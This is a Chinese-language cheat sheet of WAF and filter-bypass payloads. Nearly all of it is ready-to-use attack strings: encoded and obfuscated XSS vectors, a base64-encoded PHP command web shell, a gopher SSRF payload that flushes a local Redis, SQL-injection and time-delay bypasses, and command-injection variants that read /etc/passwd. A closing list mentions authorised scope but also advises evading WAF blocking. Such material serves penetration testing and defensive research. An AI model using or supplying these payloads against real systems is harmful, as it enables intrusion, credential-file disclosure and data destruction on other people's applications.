# WAF/过滤绕过技术

## 1. 编码绕过

### URL编码
```
原始: <script>alert(1)</script>
编码: %3Cscript%3Ealert%281%29%3C%2Fscript%3E
双重编码: %253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
```

### HTML实体编码
```
原始: <script>alert(1)</script>
编码: &#60;script&#62;alert&#40;1&#41;&#60;/script&#62;
十六进制: &#x3C;script&#x3E;alert&#x28;1&#x29;&#x3C;/script&#x3E;
```

### Unicode编码
```
原始: <script>alert(1)</script>
编码: \u003cscript\u003ealert(1)\u003c/script\u003e
```

### Base64编码
```
原始: <?php system($_GET['cmd']); ?>
编码: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

---

## 2. 大小写混合

```
原始: <script>alert(1)</script>
绕过: <ScRiPt>alert(1)</ScRiPt>
绕过: <SCRIPT>alert(1)</SCRIPT>
```

**适用场景**: 简单的正则匹配

---

## 3. 空白字符插入

### Tab/换行/空格
```
原始: <script>alert(1)</script>
绕过: <script	>alert(1)</script>
绕过: <script
>alert(1)</script>
绕过: <script    >alert(1)</script>
```

### 注释插入
```
原始: <script>alert(1)</script>
绕过: <script/**/>alert(1)</script>
绕过: <script/*!*/>alert(1)</script>
```

---

## 4. 标签/属性替换

### XSS标签替换
```
原始: <script>alert(1)</script>
替换: <img src=x onerror=alert(1)>
替换: <svg onload=alert(1)>
替换: <body onload=alert(1)>
替换: <details open ontoggle=alert(1)>
替换: <marquee onstart=alert(1)>
替换: <audio src=x onerror=alert(1)>
替换: <video src=x onerror=alert(1)>
```

### 事件属性替换
```
onclick, onerror, onload, onmouseover, onfocus, onblur
ontoggle, onstart, onanimationend, ontransitionend
```

---

## 5. 协议利用

### SSRF协议
```
http:// - 标准HTTP请求
https:// - HTTPS请求
file:// - 本地文件读取
gopher:// - TCP协议利用
dict:// - 字典协议
ldap:// - LDAP协议
```

### Gopher构造
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
```

---

## 6. SQL注入绕过

### 关键字替换
```
原始: SELECT * FROM users
绕过: SEL/**/ECT * FR/**/OM users
绕过: sElEcT * FrOm users
绕过: %53ELECT * %46ROM users
```

### 函数替换
```
原始: SLEEP(5)
绕过: BENCHMARK(5000000,SHA1('test'))
绕过: RLIKE(SLEEP(5))
绕过: IF(1=1,SLEEP(5),0)
```

### 空格替代
```
原始: SELECT * FROM users WHERE id=1
绕过: SELECT/**/*/**/FROM/**/users/**/WHERE/**/id=1
绕过: SELECT%0a*%0aFROM%0ausers%0aWHERE%0aid=1
绕过: SELECT%09*%09FROM%09users%09WHERE%09id=1
```

---

## 7. 命令注入绕过

### 管道符变体
```
| - 管道
|| - 或运算
& - 后台执行
&& - 与运算
; - 命令分隔
%0a - 换行符
%0d - 回车符
`command` - 反引号执行
$(command) - 子shell执行
```

### 空格替代
```
原始: cat /etc/passwd
绕过: cat${IFS}/etc/passwd
绕过: cat$IFS/etc/passwd
绕过: {cat,/etc/passwd}
绕过: cat</etc/passwd
```

### 命令替换
```
原始: whoami
绕过: w\hoami
绕过: wh''oami
绕过: wh""oami
绕过: who$()ami
绕过: `echo whoami`
```

---

## 8. 分块传输绕过

### Transfer-Encoding: chunked
```
POST /api HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5
hello
5
world
0
```

**原理**: WAF可能不解析分块请求体

---

## 绕过技术选择指南

| WAF类型 | 推荐绕过技术 |
|---------|-------------|
| 云WAF | 编码绕过、分块传输 |
| 硬件WAF | 协议利用、编码绕过 |
| 软件WAF | 大小写混合、空白插入 |
| 自定义过滤 | 标签替换、函数替换 |

---

## 注意事项

1. 绕过测试需在授权范围内进行
2. 记录成功的绕过方法用于报告
3. 组合多种技术提高成功率
4. 关注WAF日志避免被封禁
